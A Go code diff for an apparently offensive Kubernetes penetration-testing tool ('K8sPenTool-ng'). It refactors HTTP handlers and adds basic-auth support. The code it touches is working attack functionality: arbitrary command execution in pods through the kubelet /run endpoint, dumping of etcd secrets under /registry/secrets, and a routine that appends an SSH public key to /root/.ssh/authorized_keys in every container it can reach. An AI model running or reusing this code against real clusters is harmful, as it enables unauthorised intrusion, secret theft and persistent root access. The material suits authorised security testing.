@@ -5,9 +5,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"sort"
 	"strings"
 
 	"github.com/gin-gonic/gin"
+	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
 	"k8s.io/client-go/tools/clientcmd"
 )
@@ -22,8 +24,47 @@ func NewAccessHandler() *AccessHandler {
 type accessRequest struct {
 	TargetHost string `json:"target_host" binding:"required"`
 	Token      string `json:"token"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
 	TimeoutSec int    `json:"timeout_sec"`
 	SkipTLS    bool   `json:"skip_tls"`
+}
+
+func httpStatusAccessible(code int) bool {
+	return code >= 200 && code < 300
+}
+
+func buildAPIServerURL(targetHost, path string) string {
+	base := strings.TrimRight(kubectl.APIServerURL(targetHost), "/")
+	if path == "" {
+		return base
+	}
+	if strings.HasPrefix(path, "/") {
+		return base + path
+	}
+	return base + "/" + path
+}
+
+func buildKubeletURL(targetHost, path string) string {
+	return kubectl.TargetServiceURL(targetHost, "https", 10250, path)
+}
+
+func buildEtcdURL(targetHost, path string) string {
+	return kubectl.TargetServiceURL(targetHost, "http", 2379, path)
+}
+
+func buildStructuredHTTPResponse(code int, body []byte) gin.H {
+	resp := gin.H{
+		"reachable":   true,
+		"accessible":  httpStatusAccessible(code),
+		"status_code": code,
+		"body":        util.FormatResponse(code, body),
+	}
+	if parsedKey, parsedItems := tryParseItems(body); parsedKey != "" {
+		resp[parsedKey] = parsedItems
+		resp["total"] = len(parsedItems)
+	}
+	return resp
 }
 
 // APIServer
@@ -36,45 +77,13 @@ func (h *AccessHandler) CheckAPIServer(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "https://" + req.TargetHost + ":6443/api/v1/namespaces"
-	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
+	url := buildAPIServerURL(req.TargetHost, "/api/v1/namespaces")
+	code, body, err := util.SendRequestWithAuth(url, "GET", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
 		return
 	}
-	// inline parse K8s API response
-	var parsed map[string]interface{}
-	parsedKey, parsedItems := "", []gin.H(nil)
-	if err := json.Unmarshal(body, &parsed); err == nil {
-		if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
-			// kind is at top level (e.g. "SecretList"), not in items
-			listKind, _ := parsed["kind"].(string)
-			kind := strings.TrimSuffix(listKind, "List")
-			parsedItems = make([]gin.H, 0, len(rawItems))
-			for _, ri := range rawItems {
-				obj, _ := ri.(map[string]interface{})
-				meta, _ := obj["metadata"].(map[string]interface{})
-				data, _ := obj["data"].(map[string]interface{})
-				name, _ := meta["name"].(string)
-				ns, _ := meta["namespace"].(string)
-				typ, _ := obj["type"].(string)
-				decoded := make(map[string]string)
-				for k, v := range data {
-					if s, ok := v.(string); ok {
-						decoded[k] = s
-					}
-				}
-				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
-			}
-			parsedKey = strings.ToLower(kind) + "s"
-		}
-	}
-	resp := gin.H{"accessible": true, "status_code": code, "body": util.FormatResponse(code, body)}
-	if parsedKey != "" {
-		resp[parsedKey] = parsedItems
-		resp["total"] = len(parsedItems)
-	}
-	c.JSON(http.StatusOK, resp)
+	c.JSON(http.StatusOK, buildStructuredHTTPResponse(code, body))
 }
 
 func (h *AccessHandler) CheckInsecurePort(c *gin.Context) {
@@ -83,7 +92,7 @@ func (h *AccessHandler) CheckInsecurePort(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	open := util.IsPortOpen(req.TargetHost, 8080, 3)
+	open := util.IsPortOpen(kubectl.TargetHostname(req.TargetHost), 8080, 3)
 	c.JSON(http.StatusOK, gin.H{"port": 8080, "open": open})
 }
 
@@ -93,6 +102,8 @@ func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 		Path        string `json:"path" binding:"required"`
 		Method      string `json:"method"`
 		Token       string `json:"token"`
+		Username    string `json:"username"`
+		Password    string `json:"password"`
 		Body        string `json:"body"`
 		ContentType string `json:"content_type"`
 		TimeoutSec  int    `json:"timeout_sec"`
@@ -108,85 +119,22 @@ func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "https://" + req.TargetHost + ":6443" + req.Path
+	url := buildAPIServerURL(req.TargetHost, req.Path)
 	if req.Body != "" {
-		code, body, err := util.SendPost(url, req.Body, req.ContentType, req.Token, req.TimeoutSec, req.SkipTLS)
+		code, body, err := util.SendRequestWithBodyWithAuth(url, req.Method, req.Body, req.ContentType, req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 		if err != nil {
 			c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
 			return
 		}
-		// inline parse K8s API response
-		var parsed map[string]interface{}
-		parsedKey, parsedItems := "", []gin.H(nil)
-		if err := json.Unmarshal(body, &parsed); err == nil {
-			if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
-				// kind is at top level (e.g. "SecretList"), not in items
-				listKind, _ := parsed["kind"].(string)
-				kind := strings.TrimSuffix(listKind, "List")
-				parsedItems = make([]gin.H, 0, len(rawItems))
-				for _, ri := range rawItems {
-					obj, _ := ri.(map[string]interface{})
-					meta, _ := obj["metadata"].(map[string]interface{})
-					data, _ := obj["data"].(map[string]interface{})
-					name, _ := meta["name"].(string)
-					ns, _ := meta["namespace"].(string)
-					typ, _ := obj["type"].(string)
-					decoded := make(map[string]string)
-					for k, v := range data {
-						if s, ok := v.(string); ok {
-							decoded[k] = s
-						}
-					}
-					parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
-				}
-				parsedKey = strings.ToLower(kind) + "s"
-			}
-		}
-		resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
-		if parsedKey != "" {
-			resp[parsedKey] = parsedItems
-			resp["total"] = len(parsedItems)
-		}
-		c.JSON(http.StatusOK, resp)
+		c.JSON(http.StatusOK, buildStructuredHTTPResponse(code, body))
 		return
 	}
-	code, body, err := util.SendRequest(url, req.Method, req.Token, req.TimeoutSec, req.SkipTLS)
+	code, body, err := util.SendRequestWithAuth(url, req.Method, req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
 		return
 	}
-	var parsed2 map[string]interface{}
-	parsedKey, parsedItems := "", []gin.H(nil)
-	if err := json.Unmarshal(body, &parsed2); err == nil {
-		if rawItems, ok := parsed2["items"].([]interface{}); ok && len(rawItems) > 0 {
-			// kind is at top level (e.g. "SecretList"), not in items
-			listKind, _ := parsed2["kind"].(string)
-			kind := strings.TrimSuffix(listKind, "List")
-			parsedItems = make([]gin.H, 0, len(rawItems))
-			for _, ri := range rawItems {
-				obj, _ := ri.(map[string]interface{})
-				meta, _ := obj["metadata"].(map[string]interface{})
-				data, _ := obj["data"].(map[string]interface{})
-				name, _ := meta["name"].(string)
-				ns, _ := meta["namespace"].(string)
-				typ, _ := obj["type"].(string)
-				decoded := make(map[string]string)
-				for k, v := range data {
-					if s, ok := v.(string); ok {
-						decoded[k] = s
-					}
-				}
-				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
-			}
-			parsedKey = strings.ToLower(kind) + "s"
-		}
-	}
-	resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
-	if parsedKey != "" {
-		resp[parsedKey] = parsedItems
-		resp["total"] = len(parsedItems)
-	}
-	c.JSON(http.StatusOK, resp)
+	c.JSON(http.StatusOK, buildStructuredHTTPResponse(code, body))
 }
 
 // Kubelet
@@ -199,14 +147,15 @@ func (h *AccessHandler) CheckKubelet(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "https://" + req.TargetHost + ":10250/pods"
-	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
+	url := buildKubeletURL(req.TargetHost, "/pods")
+	code, body, err := util.SendRequestWithAuth(url, "GET", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
 		return
 	}
 	c.JSON(http.StatusOK, gin.H{
-		"accessible":  true,
+		"reachable":   true,
+		"accessible":  httpStatusAccessible(code),
 		"status_code": code,
 		"body":        util.FormatResponse(code, body),
 	})
@@ -220,6 +169,8 @@ func (h *AccessHandler) KubeletExec(c *gin.Context) {
 		ContainerName string `json:"container_name"`
 		Command       string `json:"command" binding:"required"`
 		Token         string `json:"token"`
+		Username      string `json:"username"`
+		Password      string `json:"password"`
 		TimeoutSec    int    `json:"timeout_sec"`
 		SkipTLS       bool   `json:"skip_tls"`
 	}
@@ -233,12 +184,12 @@ func (h *AccessHandler) KubeletExec(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "https://" + req.TargetHost + ":10250/run/" + req.Namespace + "/" + req.PodName
+	url := buildKubeletURL(req.TargetHost, "/run/"+req.Namespace+"/"+req.PodName)
 	if req.ContainerName != "" {
 		url += "/" + req.ContainerName
 	}
-	code, body, err := util.SendPost(url, encodeKubeletCommandForm(req.Command),
-		"application/x-www-form-urlencoded", req.Token, req.TimeoutSec, req.SkipTLS)
+	code, body, err := util.SendPostWithAuth(url, encodeKubeletCommandForm(req.Command),
+		"application/x-www-form-urlencoded", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
 		return
@@ -253,7 +204,7 @@ func (h *AccessHandler) CheckEtcd(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-	open := util.IsPortOpen(req.TargetHost, 2379, 3)
+	open := util.IsPortOpen(kubectl.TargetHostname(req.TargetHost), 2379, 3)
 	if !open {
 		c.JSON(http.StatusOK, gin.H{"accessible": false, "port": 2379})
 		return
@@ -261,7 +212,7 @@ func (h *AccessHandler) CheckEtcd(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "http://" + req.TargetHost + ":2379/v2/keys"
+	url := buildEtcdURL(req.TargetHost, "/v2/keys")
 	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"accessible": false, "error": err.Error()})
@@ -282,7 +233,7 @@ func (h *AccessHandler) EtcdGetKeys(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "http://" + req.TargetHost + ":2379/v2/keys?recursive=true"
+	url := buildEtcdURL(req.TargetHost, "/v2/keys?recursive=true")
 	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
@@ -304,7 +255,7 @@ func (h *AccessHandler) EtcdReadKey(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "http://" + req.TargetHost + ":2379/v2/keys" + req.Key
+	url := buildEtcdURL(req.TargetHost, "/v2/keys"+req.Key)
 	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, false)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
@@ -418,7 +369,7 @@ func (h *AccessHandler) EtcdV3GetKeys(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "http://" + req.TargetHost + ":2379/v3/kv/range"
+	url := buildEtcdURL(req.TargetHost, "/v3/kv/range")
 	body := `{"key":"` + base64Encode("\x00") + `","range_end":"` + base64Encode("\xff") + `"}`
 	code, respBody, err := util.SendPost(url, body, "application/json", "", req.TimeoutSec, false)
 	if err != nil {
@@ -440,7 +391,7 @@ func (h *AccessHandler) EtcdV3SearchSecrets(c *gin.Context) {
 	if req.TimeoutSec == 0 {
 		req.TimeoutSec = 10
 	}
-	url := "http://" + req.TargetHost + ":2379/v3/kv/range"
+	url := buildEtcdURL(req.TargetHost, "/v3/kv/range")
 	keyStart := base64Encode("/registry/secrets/")
 	keyEnd := base64Encode("/registry/secrets0")
 	body := fmt.Sprintf(`{"key":"%s","range_end":"%s"}`, keyStart, keyEnd)
@@ -462,6 +413,8 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 		TargetHost string `json:"target_host" binding:"required"`
 		SSHKey     string `json:"ssh_pub_key" binding:"required"`
 		Token      string `json:"token"`
+		Username   string `json:"username"`
+		Password   string `json:"password"`
 		TimeoutSec int    `json:"timeout_sec"`
 		SkipTLS    bool   `json:"skip_tls"`
 	}
@@ -473,8 +426,8 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 		req.TimeoutSec = 10
 	}
 
-	url := "https://" + req.TargetHost + ":10250/pods"
-	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
+	url := buildKubeletURL(req.TargetHost, "/pods")
+	code, body, err := util.SendRequestWithAuth(url, "GET", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 	if err != nil || code != 200 {
 		c.JSON(http.StatusOK, gin.H{"error": "Failed to list pods via Kubelet", "status_code": code})
 		return
@@ -500,14 +453,14 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 			containers = []kubeletContainer{{Name: ""}}
 		}
 		for _, c := range containers {
-			execUrl := fmt.Sprintf("https://%s:10250/run/%s/%s", req.TargetHost, ns, podName)
+			execUrl := buildKubeletURL(req.TargetHost, "/run/"+ns+"/"+podName)
 			if c.Name != "" {
 				execUrl += "/" + c.Name
 			}
 
 			sshCmd := fmt.Sprintf("mkdir -p /root/.ssh 2>/dev/null && printf '%%s\\n' %s >> /root/.ssh/authorized_keys 2>/dev/null && chmod 600 /root/.ssh/authorized_keys 2>/dev/null && echo 'SSH_KEY_INJECTED' || echo 'FAILED'",
 				quotedKey)
-			ec, eb, execErr := util.SendPost(execUrl, encodeKubeletCommandForm(sshCmd), "application/x-www-form-urlencoded", req.Token, req.TimeoutSec, req.SkipTLS)
+			ec, eb, execErr := util.SendPostWithAuth(execUrl, encodeKubeletCommandForm(sshCmd), "application/x-www-form-urlencoded", req.Token, req.Username, req.Password, req.TimeoutSec, req.SkipTLS)
 
 			result := gin.H{
 				"namespace": ns,
@@ -584,13 +537,12 @@ func tryParseItems(body []byte) (string, []gin.H) {
 			name, _ := meta["name"].(string)
 			ns, _ := meta["namespace"].(string)
 			typ, _ := obj["type"].(string)
-			decoded := make(map[string]string)
-			for k, v := range data {
-				if s, ok := v.(string); ok {
-					decoded[k] = s // base64 原文，前端可自行解码
-				}
+			keyNames := make([]string, 0, len(data))
+			for k := range data {
+				keyNames = append(keyNames, k)
 			}
-			result = append(result, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
+			sort.Strings(keyNames)
+			result = append(result, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "key_names": keyNames})
 		}
 	case "Pod":
 		for _, item := range items {
